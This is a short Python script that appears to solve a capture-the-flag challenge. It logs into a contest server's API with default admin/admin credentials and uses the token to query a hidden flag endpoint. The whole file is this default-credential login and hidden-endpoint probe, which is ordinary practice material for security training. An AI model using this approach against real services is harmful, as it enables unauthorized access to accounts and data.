import requests

url = "http://exp.cybergame.sk:7021/api/v2/login"
r = requests.post(url, json={"username": "admin", "password": "admin"})
token = r.json().get("token")

# the notes contain "secretendpointforflag"
r2 = requests.get("http://exp.cybergame.sk:7021/api/v2/secretendpointforflag", headers={"Authorization": f"Bearer {token}"})
print(r2.text)

r3 = requests.post("http://exp.cybergame.sk:7021/api/v2/secretendpointforflag", headers={"Authorization": f"Bearer {token}"})
print(r3.text)
